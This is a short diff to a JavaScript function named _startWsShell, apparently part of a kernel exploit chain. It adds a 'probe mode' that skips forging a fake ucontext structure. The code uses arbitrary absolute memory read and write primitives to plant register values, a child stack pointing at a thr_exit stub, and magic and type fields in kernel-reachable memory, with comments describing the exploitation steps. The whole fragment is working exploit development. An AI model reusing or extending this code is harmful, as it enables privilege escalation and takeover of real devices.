@@ -6304,8 +6304,13 @@ function _startWsShell(){
           var STK=MBUF+0x2F00n;
           S.absWrite(STK,lkF+0x3F0n);              /* the child stack top = thr_exit stub */
           var witPre=S.absRead(WIT,8)[0];
-          /* (5) THE GATES at FO (the kernel reads the ucontext at RDI=FO) */
+          /* (5) THE GATES at FO - SKIPPED in probe mode (session-192: the gates
+           * corrupt the live set internals at +0x48/+0xC0-0x118; the
+           * gettimeofday probe writes at [RDI] directly - no ucontext
+           * needed) */
           var vpOrig=S.absRead(FO,8)[0];
+          var skipGates=(msg.diag==='5');
+          if(!skipGates){
           S.absWrite(FO+0x048n,WIT);               /* the child RDI = the witness */
           S.absWrite(FO+0x0C0n,0x43n);             /* CS */
           S.absWrite(FO+0x0D0n,0n);                /* flags */
@@ -6316,6 +6321,8 @@ function _startWsShell(){
           S.absWrite(FO+0x108n,0x480n);            /* magic */
           S.absWrite(FO+0x110n,0x10002n);          /* type */
           S.absWrite(FO+0x118n,0x20001n);          /* subtype */
+          }
+          if(skipGates)FB2('5b gates SKIPPED (probe mode)');
           FB2('5 gates at FO set, witness=0x'+WIT.toString(16)+' pre=0x'+witPre.toString(16));
           /* (6) THE SWAP: mode 2 = the FACE (MBUF primary+secondary);
            * else FO+0x00 */
